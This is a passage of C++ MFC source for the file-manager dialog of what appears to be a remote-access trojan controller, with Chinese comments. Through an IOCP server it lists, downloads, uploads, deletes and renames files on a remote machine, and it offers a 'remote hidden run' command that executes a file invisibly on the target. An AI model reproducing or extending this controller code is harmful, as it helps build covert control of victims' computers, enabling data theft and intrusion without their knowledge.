		GENERIC_WRITE, 0, NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, 0);
	// 需要错误处理
	if (m_hFileRecv == INVALID_HANDLE_VALUE)
	{
		m_nOperatingFileLength = 0;
		m_nCounter = 0;
		::MessageBox(m_hWnd, m_strReceiveLocalFile + _T(" 文件创建失败"), _T("警告"), MB_OK | MB_ICONWARNING);
		return;
	}


	ShowProgress();
	if (m_bIsStop)
		SendStop(TRUE);
	else
	{
		// 发送继续传输文件的token,包含文件续传的偏移
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
}

//显示进度条
void CFileManagerDlg::ShowProgress()
{
	TCHAR* lpDirection = NULL;
	if (m_bIsUpload)
		lpDirection = _T("文件上传");
	else
		lpDirection = _T("文件下载");

	if (m_nCounter == -1)
	{
		m_nCounter = m_nOperatingFileLength;
	}

	int	progress = (int)((double)(m_nCounter * 100) / m_nOperatingFileLength);
	CString str; DWORD_PTR dwResult;
	if (m_nCounter >= 1024 * 1024 * 1024)
		str.Format(_T("%.2f GB (%d%%)"), (double)m_nCounter / (1024 * 1024 * 1024), progress);
	else if (m_nCounter >= 1024 * 1024)
		str.Format(_T("%.2f MB (%d%%)"), (double)m_nCounter / (1024 * 1024), progress);
	else
		str.Format(_T("%I64u KB (%d%%)"), m_nCounter / 1024 + (m_nCounter % 1024 ? 1 : 0), progress);

	//状态栏显示
	strShowText.Format(_T("%s: %s"), lpDirection, m_strFileName);
	PostMessage(WM_SHOW_MSG, 0, 0);
	m_ProgressCtrl->SetPos(progress);
	if (m_nCounter == m_nOperatingFileLength)
	{
		m_nCounter = m_nOperatingFileLength = 0;
	}
}

//停止传输
void CFileManagerDlg::SendStop(BOOL bIsDownload)
{
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileRecv);
		m_hFileRecv = INVALID_HANDLE_VALUE;
	}
	BYTE	bBuff[2];
	bBuff[0] = COMMAND_STOP;
	bBuff[1] = bIsDownload;
	m_iocpServer->Send(m_pContext, bBuff, sizeof(bBuff));
}


//获取图标
int	CFileManagerDlg::GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes)
{
	SHFILEINFO	sfi;
	ZeroMemory(&sfi, sizeof(SHFILEINFO));
	if (dwFileAttributes == INVALID_FILE_ATTRIBUTES)
		dwFileAttributes = FILE_ATTRIBUTE_NORMAL;
	else
		dwFileAttributes |= FILE_ATTRIBUTE_NORMAL;

	SHGetFileInfo
	(
		lpFileName,
		dwFileAttributes,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES
	);

	return sfi.iIcon;
}

//显示文件列表
void CFileManagerDlg::FixedRemoteFileList(BYTE* pbBuffer, DWORD dwBufferLen)
{
	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(NULL, &hImageListSmall);
	//给文件列表设置图标
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);

	// 重建标题
	m_list_remote.DeleteAllItems();
	while (m_list_remote.DeleteColumn(0) != 0);
	m_list_remote.InsertColumn(0, _T("名称"), LVCFMT_LEFT, 250);
	m_list_remote.InsertColumn(1, _T("大小"), LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(2, _T("类型"), LVCFMT_LEFT, 125);
	m_list_remote.InsertColumn(3, _T("修改日期"), LVCFMT_LEFT, 115);

	int	nItemIndex = 0;
	m_list_remote.SetItemData
	(
		m_list_remote.InsertItem(nItemIndex++, _T(".."), GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
		1
	);
	/*
	ListView 消除闪烁
	更新数据前用SetRedraw(FALSE)
	更新后调用SetRedraw(TRUE)
	*/
	m_list_remote.SetRedraw(FALSE);

	if (dwBufferLen != 0)
	{
		// 
		for (int i = 0; i < 2; i++)
		{
			// 跳过Token，共5字节
			byte* pList = (byte*)(pbBuffer + 1);
			for (byte* pBase = pList; (unsigned long)(pList - pBase) < dwBufferLen - 1;)
			{
				TCHAR* pszFileName = NULL;
				DWORD	dwFileSizeHigh = 0; // 文件高字节大小
				DWORD	dwFileSizeLow = 0; // 文件低字节大小
				int		nItem = 0;
				bool	bIsInsert = false;
				FILETIME	ftm_strReceiveLocalFileTime;

				int	nType = *pList ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
				// i 为 0 时，列目录，i为1时列文件
				bIsInsert = !(nType == FILE_ATTRIBUTE_DIRECTORY) == i;
				pszFileName = (TCHAR*)++pList;

				if (bIsInsert)
				{
					nItem = m_list_remote.InsertItem(nItemIndex++, pszFileName, GetIconIndex(pszFileName, nType));
					m_list_remote.SetItemData(nItem, nType == FILE_ATTRIBUTE_DIRECTORY);
					SHFILEINFO	sfi;
					SHGetFileInfo(pszFileName, FILE_ATTRIBUTE_NORMAL | nType, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
					m_list_remote.SetItemText(nItem, 2, sfi.szTypeName);
				}

				// 得到文件大小
				pList += (lstrlen(pszFileName) + 1) * sizeof(TCHAR);
				if (bIsInsert)
				{
					CString strFileSize;
					memcpy(&dwFileSizeHigh, pList, 4);
					memcpy(&dwFileSizeLow, pList + 4, 4);
					__int64 nFileSize = ((__int64)dwFileSizeHigh << 32) + dwFileSizeLow;
					if (nFileSize >= 1024 * 1024 * 1024)
						strFileSize.Format(_T("%10.2f GB"), (double)nFileSize / (1024 * 1024 * 1024));
					else if (nFileSize >= 1024 * 1024)
						strFileSize.Format(_T("%10.2f MB"), (double)nFileSize / (1024 * 1024));
					else
						strFileSize.Format(_T("%10I64u KB"), nFileSize / 1024 + (nFileSize % 1024 ? 1 : 0));
					m_list_remote.SetItemText(nItem, 1, strFileSize);
					memcpy(&ftm_strReceiveLocalFileTime, pList + 8, sizeof(FILETIME));
					CTime	time(ftm_strReceiveLocalFileTime);
					m_list_remote.SetItemText(nItem, 3, time.Format(_T("%Y-%m-%d %H:%M")));
				}
				pList += 16;
			}
		}
	}

	m_list_remote.SetRedraw(TRUE);
	// 恢复窗口
	m_list_remote.EnableWindow(TRUE);

	if (DRIVE_CAZ == FALSE)
	{
		//设置状态栏消息
		strShowText.Format(_T("远程目录：%s"), m_Remote_Path);
		PostMessage(WM_SHOW_MSG, 0, 0);
		m_ProgressCtrl->SetPos(100);
	}


}

void CFileManagerDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnClose();

	CDialogEx::PostNcDestroy();
	delete this;
}

//加载图标
BOOL CFileManagerDlg::MyShell_GetImageLists()
{
	I_ImageList0.DeleteImageList();
	I_ImageList0.Create(32, 32, ILC_COLOR32 | ILC_MASK, 2, 2);
	I_ImageList0.SetBkColor(::GetSysColor(COLOR_BTNFACE));
	I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_MGICON_A));
	I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_MGICON_C));
	I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_MGICON_D));
	I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_MGICON_E));
	I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_MGICON_F));
	I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_MGICON_G));

	I_ImageList1.DeleteImageList();
	I_ImageList1.Create(16, 16, ILC_COLOR32 | ILC_MASK, 2, 2);
	I_ImageList1.SetBkColor(::GetSysColor(COLOR_BTNFACE));
	I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_MGICON_A));
	I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_MGICON_C));
	I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_MGICON_D));
	I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_MGICON_E));
	I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_MGICON_F));
	I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_MGICON_G));

	return TRUE;
}

//文件列表双击左键
void CFileManagerDlg::OnNMDblclkListRemote(NMHDR *pNMHDR, LRESULT *pResult)
{
	if (m_list_remote.GetSelectedCount() == 0 || m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) != 1)
		return;
	// TODO: Add your control notification handler code here
	GetRemoteFileList();
	*pResult = 0;
}

//获取父目录
CString CFileManagerDlg::GetParentDirectory(CString strPath)
{
	CString	strCurPath = strPath;
	int Index = strCurPath.ReverseFind(_T('\\'));
	if (Index == -1)
	{
		return strCurPath;
	}
	CString str = strCurPath.Left(Index);
	Index = str.ReverseFind(_T('\\'));
	if (Index == -1)
	{
		strCurPath = _T("");
		return strCurPath;
	}
	strCurPath = str.Left(Index);

	if (strCurPath.Right(1) != _T("\\"))
		strCurPath += _T("\\");
	return strCurPath;
}

//获取文件列表
void CFileManagerDlg::GetRemoteFileList(CString directory)
{
	//判断目录是否为空 则获取选中的目录
	if (directory.GetLength() == 0)
	{
		int	nItem = m_list_remote.GetSelectionMark();

		// 如果有选中的，是目录
		if (nItem != -1)
		{
			if (m_list_remote.GetItemData(nItem) == 1)
			{
				directory = m_list_remote.GetItemText(nItem, 0);
			}
		}
		// 从组合框里得到路径
		else
		{
			m_Remote_Directory_ComboBox.GetWindowText(m_Remote_Path);
		}
	}

	// 得到父目录
	if (directory == _T(".."))
	{
		m_Remote_Path = GetParentDirectory(m_Remote_Path);
	}
	else if (directory != _T("."))
	{
		m_Remote_Path += directory;
		if (m_Remote_Path.GetLength() > 0 && m_Remote_Path.Right(1) != _T("\\"))
			m_Remote_Path += _T("\\");
	}

	// 是驱动器的根目录,返回磁盘列表
	if (m_Remote_Path.GetLength() == 0)
	{
		FixedRemoteDriveList();
		return;
	}

	// 发送数据前清空缓冲区
	int	PacketSize = m_Remote_Path.GetLength() + 2;
	BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, PacketSize);


	bPacket[0] = COMMAND_LIST_FILES;
	memcpy(bPacket + 1, m_Remote_Path.GetBuffer(0), PacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, PacketSize);
	LocalFree(bPacket);

	m_Remote_Directory_ComboBox.InsertString(0, m_Remote_Path);
	m_Remote_Directory_ComboBox.SetCurSel(0);

	// 得到返回数据前禁窗口
	m_list_remote.EnableWindow(FALSE);
	m_ProgressCtrl->SetPos(0);

	DRIVE_CAZ = FALSE;
}

//下拉框获取焦点 取消list选中项
void CFileManagerDlg::OnCbnSetfocusRemotePath()
{
	m_list_remote.SetSelectionMark(-1);
}

//这里拦截消息 获取回车操作
BOOL CFileManagerDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)
	{
		// 在当前窗口按了esc 
		if (pMsg->wParam == VK_ESCAPE) 
		{
			GetRemoteFileList("..");
			return true;
		}

		if (pMsg->wParam == VK_ESCAPE)
			return true;
		if (pMsg->wParam == VK_RETURN)
		{
			if (pMsg->hwnd == m_list_remote.m_hWnd ||
					pMsg->hwnd == ((CEdit*)m_Remote_Directory_ComboBox.GetWindow(GW_CHILD))->m_hWnd)
				{
					GetRemoteFileList();
				}
			return TRUE;
		}
	}
	// 单击除了窗口标题栏以外的区域使窗口移动
	if (pMsg->message == WM_LBUTTONDOWN && pMsg->hwnd == m_hWnd)
	{
		pMsg->message = WM_NCLBUTTONDOWN;
		pMsg->wParam = HTCAPTION;
	}
	
	return CDialog::PreTranslateMessage(pMsg);
}

//右键单击
void CFileManagerDlg::OnNMRClickListRemote(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO: Add your control notification handler code here
	int	nRemoteOpenMenuIndex = 5;

	CListCtrl* pListCtrl = &m_list_remote;

	CMenu	popup;
	popup.LoadMenu(IDR_MENU_FILEM);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

	if (pListCtrl->GetSelectedCount() == 0 || !m_Remote_Path.GetLength())
	{
		int	count = pM->GetMenuItemCount();
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
		if (m_Remote_Path.GetLength())
		{
			pM->EnableMenuItem(IDM_TRANSFER_S, MF_BYCOMMAND | MF_ENABLED);
			pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
		}
	}
	if (pListCtrl->GetSelectedCount() == 1)
	{   // 单选如果是目录, 不能隐藏运行
		if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
		{
			pM->EnableMenuItem(IDM_REMOTE_OPEN_HIDE, MF_BYCOMMAND | MF_GRAYED);
		}
	}
	if (pListCtrl->GetSelectedCount() > 1)
	{
		pM->EnableMenuItem(IDM_REMOTE_OPEN_HIDE, MF_BYCOMMAND | MF_GRAYED);
		pM->EnableMenuItem(IDM_RENAME, MF_BYCOMMAND | MF_GRAYED);
	}

	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
	CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON, p.x, p.y, this);

	pM->DestroyMenu();
	*pResult = 0;
}

//菜单刷新项
void CFileManagerDlg::OnRefresh()
{
	GetRemoteFileList(_T("."));
}

//远程隐藏运行
void CFileManagerDlg::OnRemoteOpenHide()
{
	// TODO: Add your command handler code here
	CString	str;
	int	nItem = m_list_remote.GetSelectionMark();
	str = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
	if (m_list_remote.GetItemData(nItem) == 1)
		str += _T("\\");

	int		nPacketLength = (str.GetLength() + 1) * sizeof(TCHAR) + 1;
	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_OPEN_FILE;
	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	LocalFree(lpPacket);
}

//下载
void CFileManagerDlg::OnTransferR()
{
	OnRemoteCopy(); //下载
}

void CFileManagerDlg::EnableControl(BOOL bEnable)
{
	m_list_remote.EnableWindow(bEnable);
	m_Remote_Directory_ComboBox.EnableWindow(bEnable);
}

//选择路径
CString  CFileManagerDlg::GetDirectoryPath(BOOL bIncludeF)
{
	TCHAR szPath[MAX_PATH]; //用来存储路径的字符串
	GetModuleFileName(NULL, szPath, MAX_PATH);
	CString strPath = szPath;
	BROWSEINFO bInfo;
	ZeroMemory(&bInfo, sizeof(bInfo));
	bInfo.hwndOwner = m_hWnd;
	bInfo.lParam = (LPARAM)strPath.GetBuffer(strPath.GetLength());
	if (bIncludeF)
	{
		bInfo.lpszTitle = _T("请选择上传路径: ");
		bInfo.ulFlags = BIF_BROWSEINCLUDEFILES | 0x40;
	}
	else
	{
		bInfo.lpszTitle = _T("请选择下载路径: ");
		bInfo.ulFlags = BIF_RETURNONLYFSDIRS | 0x40;
	}

	strPath = _T("");         //先清空返回的路径
	LPITEMIDLIST lpDlist; //用来保存返回信息的IDList
	lpDlist = SHBrowseForFolder(&bInfo); //显示选择对话框
	if (lpDlist != NULL)   //用户按了确定按钮
	{
		SHGetPathFromIDList(lpDlist, szPath);//把项目标识列表转化成字符串
		strPath.Format(_T("%s"), szPath); //将TCHAR类型的字符串转换为CString类型的字符串
	}
	return strPath;
}


void CFileManagerDlg::OnRemoteCopy()
{
	m_bIsUpload = false;
	// 禁用文件管理窗口
	EnableControl(FALSE);

	// 重置下载任务列表
	CString	file;
	m_Remote_Download_Job.RemoveAll();
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition();
	while (pos)
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);
		file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
		// 如果是目录
		if (m_list_remote.GetItemData(nItem))
			file += '\\';
		m_Remote_Download_Job.AddTail(file);
	}
	if (file.IsEmpty())
	{
		EnableControl(TRUE);
		::MessageBox(m_hWnd, _T("请选择文件！"), _T("警告"), MB_OK | MB_ICONWARNING);
		return;
	}
	strLpath = GetDirectoryPath(FALSE);
	if (strLpath == _T(""))
	{
		EnableControl(TRUE);
		//::MessageBox(m_hWnd, "Path Error！", "警告", MB_OK|MB_ICONWARNING);
		return;
	}
	if (strLpath.GetAt(strLpath.GetLength() - 1) != _T('\\'))
		strLpath += _T("\\");
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	// 发送第一个下载任务
	SendDownloadJob();
}
BOOL CFileManagerDlg::SendDownloadJob()
{
	if (m_Remote_Download_Job.IsEmpty())
		return FALSE;

	EnableControl(FALSE);
	// 发出第一个下载任务命令
	CString file = m_Remote_Download_Job.GetHead();
	int		nPacketSize = (file.GetLength() + 1) * sizeof(TCHAR) + 1;
	BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);
	bPacket[0] = COMMAND_DOWN_FILES;

	// 文件偏移，续传时用
	memcpy(bPacket + 1, file.GetBuffer(0), (file.GetLength() + 1) * sizeof(TCHAR));
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);
	LocalFree(bPacket);

	// 从下载任务列表中删除自己
	m_Remote_Download_Job.RemoveHead();

	return TRUE;
}

//删除文件
void CFileManagerDlg::OnDelete()
{
	OnRemoteDelete();
}

void CFileManagerDlg::OnRemoteDelete()
{
	m_bIsUpload = false;
	// TODO: Add your command handler code here
	CString str;
	if (m_list_remote.GetSelectedCount() > 1)
		str.Format(_T("确定要将这 %d 项删除吗?"), m_list_remote.GetSelectedCount());
	else
	{
		CString file = m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);
		if (m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) == 1)
			str.Format(_T("确实要删除文件夹“%s”并将所有内容删除吗?"), file);
		else
			str.Format(_T("确实要把“%s”删除吗?"), file);
	}
	if (::MessageBox(m_hWnd, str, _T("确认删除"), MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;
	m_Remote_Delete_Job.RemoveAll();
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);
		CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
		// 如果是目录
		if (m_list_remote.GetItemData(nItem))
			file += _T('\\');

		m_Remote_Delete_Job.AddTail(file);
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory

	EnableControl(FALSE);
	// 发送第一个下载任务
	SendDeleteJob();
}
BOOL CFileManagerDlg::SendDeleteJob()
{

	if (m_Remote_Delete_Job.IsEmpty())
		return FALSE;

	EnableControl(FALSE);
	// 发出第一个下载任务命令
	CString file = m_Remote_Delete_Job.GetHead();
	int		nPacketSize = (file.GetLength() + 1) * sizeof(TCHAR) + 1;
	BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);

	m_strFileName = file;
	if (file.GetAt(file.GetLength() - 1) == '\\')
		bPacket[0] = COMMAND_DELETE_DIRECTORY;
	else
		bPacket[0] = COMMAND_DELETE_FILE;

	// 文件偏移，续传时用
	memcpy(bPacket + 1, file.GetBuffer(0), nPacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);
	LocalFree(bPacket);

	// 从下载任务列表中删除自己
	m_Remote_Delete_Job.RemoveHead();

	DRIVE_CAZ = TRUE;
	return TRUE;

}
//重命名
void CFileManagerDlg::OnRename()
{
	int id = m_list_remote.GetSelectionMark();

	if (id == -1) return;

	CInputDlg dlg(this);

	dlg.Init("重命名", "请输入新名称",m_list_remote.GetItemText(id, 0));
	if (dlg.DoModal() != IDOK || dlg.m_putdata.GetLength() == 0)
		return;
	
	CString strExistingFileName = m_Remote_Path + m_list_remote.GetItemText(id, 0);
	CString strNewFileName = m_Remote_Path + dlg.m_putdata;

	if (strExistingFileName != strNewFileName)
	{
		UINT nPacketSize = (strExistingFileName.GetLength() + 1) * sizeof(TCHAR) + (strNewFileName.GetLength() + 1) * sizeof(TCHAR) + 1;
		LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketSize);
		lpBuffer[0] = COMMAND_RENAME_FILE;
		memcpy(lpBuffer + 1, strExistingFileName.GetBuffer(0), (strExistingFileName.GetLength() + 1) * sizeof(TCHAR));
		memcpy(lpBuffer + 1 + (strExistingFileName.GetLength() + 1) * sizeof(TCHAR),
			strNewFileName.GetBuffer(0), (strNewFileName.GetLength() + 1) * sizeof(TCHAR));
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
		LocalFree(lpBuffer);
	}


}

//新建文件夹
void CFileManagerDlg::OnNewfolder()
{
	if (m_Remote_Path == "")
		return;
	CInputDlg	dlg(this);
	dlg.Init(_T("新建目录"), _T("请输入目录名称:"));

	if (dlg.DoModal() == IDOK && dlg.m_putdata.GetLength())
	{
		CString file = m_Remote_Path + dlg.m_putdata + "\\";
		UINT	nPacketSize = (file.GetLength() + 1) * sizeof(TCHAR) + 1;
		// 创建多层目录
		LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, file.GetLength() + 2);
		lpBuffer[0] = COMMAND_CREATE_FOLDER;
		memcpy(lpBuffer + 1, file.GetBuffer(0), nPacketSize - 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
		LocalFree(lpBuffer);
	}
}

//上传文件目录
bool CFileManagerDlg::FixedUploadDirectory(LPCTSTR lpPathName)
{
	TCHAR	lpszFilter[MAX_PATH];
	TCHAR* lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != _T('\\'))
		lpszSlash = _T("\\");
	else
		lpszSlash = _T("");

	wsprintf(lpszFilter, _T("%s%s*.*"), lpPathName, lpszSlash);

	WIN32_FIND_DATA	wfd;
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;

	do
	{
		if (wfd.cFileName[0] == _T('.'))
			continue; // 过滤这两个目录 
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			TCHAR strDirectory[MAX_PATH];
			wsprintf(strDirectory, _T("%s%s%s"), lpPathName, lpszSlash, wfd.cFileName);
			FixedUploadDirectory(strDirectory); // 如果找到的是目录，则进入此目录进行递归 
		}
		else
		{
			CString file;
			file.Format(_T("%s%s%s"), lpPathName, lpszSlash, wfd.cFileName);
			m_Remote_Upload_Job.AddTail(file);
			// 对文件进行操作 
		}
	} while (FindNextFile(hFind, &wfd));
	FindClose(hFind); // 关闭查找句柄
	return true;
}

//上传
void CFileManagerDlg::OnTransferS()
{
	m_bIsUpload = true;
	// 重置上传任务列表
	m_Remote_Upload_Job.RemoveAll();
	CString	file = GetDirectoryPath(TRUE);
	if (file == "") return;

	m_Local_Path = file.Left(file.ReverseFind(_T('\\')) + 1);
	if (GetFileAttributes(file) & FILE_ATTRIBUTE_DIRECTORY)
	{
		if (file.GetAt(file.GetLength() - 1) != _T('\\'))
			file += _T("\\");
		FixedUploadDirectory(file.GetBuffer(0));
	}
	else
	{
		m_Remote_Upload_Job.AddTail(file);
	}

	if (m_Remote_Upload_Job.IsEmpty())
	{
		::MessageBox(m_hWnd, _T("文件夹为空"), _T("警告"), MB_OK | MB_ICONWARNING);
		return;
	}
	EnableControl(FALSE);
	SendUploadJob();
}
//上传任务
BOOL CFileManagerDlg::SendUploadJob()
{
	if (m_Remote_Upload_Job.IsEmpty())
		return FALSE;

	EnableControl(FALSE);
	CString	strDestDirectory = m_Remote_Path;
	// 如果远程也有选择，当做目标文件夹
	int nItem = m_list_remote.GetSelectionMark();

	if (!m_hCopyDestFolder.IsEmpty())
	{
		strDestDirectory += m_hCopyDestFolder + _T("\\");
	}

	if (strDestDirectory.IsEmpty())
	{
		m_Local_Path = _T("");
		m_Remote_Upload_Job.RemoveHead();
		EnableControl(TRUE);
		::MessageBox(m_hWnd, _T("请选择目录！"), _T("警告"), MB_OK | MB_ICONWARNING);
		return 0;
	}

	// 发出第一个下载任务命令
	m_strOperatingFile = m_Remote_Upload_Job.GetHead();

	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	CString	fileRemote = m_strOperatingFile; // 远程文件

	// 得到要保存到的远程的文件路径
	fileRemote.Replace(m_Local_Path, strDestDirectory);
	m_strFileName = m_strUploadRemoteFile = fileRemote;

	if (m_hFileSend != INVALID_HANDLE_VALUE)
		CloseHandle(m_hFileSend);
	m_hFileSend = CreateFile(m_strOperatingFile.GetBuffer(0),
		GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (m_hFileSend == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow = GetFileSize(m_hFileSend, &dwSizeHigh);
	m_nOperatingFileLength = ((__int64)dwSizeHigh << 32) + dwSizeLow;
	//CloseHandle(m_hFileSend); // 此处不要关闭, 以后还要用

	// 构造数据包，发送文件长度(1字节token, 8字节大小, 文件名称, '\0')
	int		nPacketSize = (fileRemote.GetLength() + 1) * sizeof(TCHAR) + 9;
	BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);

	bPacket[0] = COMMAND_FILE_SIZE;
	memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
	memcpy(bPacket + 9, fileRemote.GetBuffer(0), (fileRemote.GetLength() + 1) * sizeof(TCHAR));
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);
	LocalFree(bPacket);

	// 从下载任务列表中删除自己
	m_Remote_Upload_Job.RemoveHead();
	return TRUE;
}


void CFileManagerDlg::SortColumn1(int iCol, bool bAsc)
{
	m_bAscending1 = bAsc;
	m_nSortedCol1 = iCol;

	CXTPSortClass csc1(&m_list_remote, m_nSortedCol1);
	csc1.Sort(m_bAscending1, xtpSortString);
}

void CFileManagerDlg::SortColumn2(int iCol, bool bAsc)
{
	m_bAscending2 = bAsc;
	m_nSortedCol2 = iCol;


}

void CFileManagerDlg::SortColumn3(int iCol, bool bAsc)
{
	m_bAscending3 = bAsc;
	m_nSortedCol3 = iCol;

}

void CFileManagerDlg::SortColumn4(int iCol, bool bAsc)
{
	m_bAscending4 = bAsc;
	m_nSortedCol4 = iCol;

}

BOOL CFileManagerDlg::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult)
{
	HD_NOTIFY* pHDNotify = (HD_NOTIFY*)lParam;

	if (pHDNotify->hdr.code == HDN_ITEMCLICKA ||
		pHDNotify->hdr.code == HDN_ITEMCLICKW)
	{
		switch (0)
		{
		case 0:
			SortColumn1(pHDNotify->iItem, !m_bAscending1);
			break;
		case 1:
			SortColumn2(pHDNotify->iItem, !m_bAscending2);
			break;
		case 2:
			SortColumn3(pHDNotify->iItem, !m_bAscending3);
			break;
		case 3:
			SortColumn4(pHDNotify->iItem, !m_bAscending4);
			break;
		}
	}
	return CDialog::OnNotify(wParam, lParam, pResult);
}

void CFileManagerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	// 状态栏还没有创建
	if (m_wndStatusBar.m_hWnd == NULL)
		return;



	RECT	rect;
	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl->MoveWindow(&rect);

	// 定位状态栏
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示工具栏

		
}

HCURSOR CFileManagerDlg::OnQueryDragIcon()
{
	return (HCURSOR)m_hIcon;
}

//开始搜索
void CFileManagerDlg::OnBnClickedButton1()
{
	UpdateData();

	// 得到返回数据前禁窗口
	m_list_remote_search.DeleteAllItems();
	m_ProgressCtrl->SetPos(0);

	if (m_Remote_Path.IsEmpty()) return;

	// 构建数据包
	FILESEARCH mFileSearchPacket;
	lstrcpy(mFileSearchPacket.SearchPath, m_Remote_Path.GetBuffer(0));
	lstrcpy(mFileSearchPacket.SearchFileName, m_SearchStr.GetBuffer(0));
	if (m_bSubFordle)
		mFileSearchPacket.bEnabledSubfolder = true;
	else
		mFileSearchPacket.bEnabledSubfolder = false;

	int nPacketSize = sizeof(mFileSearchPacket) + 2;
	LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketSize);
	lpBuffer[0] = COMMAND_SEARCH_FILE;
	memcpy(lpBuffer + 1, &mFileSearchPacket, sizeof(mFileSearchPacket));
	m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);

	// 设置按钮状态
	m_BtnSearch.SetWindowText(_T("正在搜索..."));

	m_list_remote_search.ShowWindow(SW_SHOW);
	(CButton*)GetDlgItem(IDC_BUTTON1)->EnableWindow(FALSE);
	(CButton*)GetDlgItem(IDC_BUTTON2)->EnableWindow(TRUE);
	SetWindowPos(NULL, 0, 0, 600, 650, SWP_NOMOVE);

}

void CFileManagerDlg::OnBnClickedButton2()
{
	(CButton*)GetDlgItem(IDC_BUTTON2)->EnableWindow(FALSE);
	BYTE  bToken = COMMAND_FILES_SEARCH_STOP;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}


void CFileManagerDlg::OnBnClickedButton3()
{
	m_list_remote_search.ShowWindow(m_list_remote_search.IsWindowVisible() ? SW_HIDE : SW_SHOW);
	if (m_list_remote_search.IsWindowVisible())
	{
		SetWindowPos(NULL, 0, 0, 600, 650, SWP_NOMOVE);
	}
	else
	{
		SetWindowPos(NULL, 0, 0, 600, 435, SWP_NOMOVE);
	}
}

//搜索栏右键
void CFileManagerDlg::OnNMRClickListSearch(NMHDR *pNMHDR, LRESULT *pResult)
{
	CMenu mListmeau;
	mListmeau.CreatePopupMenu();
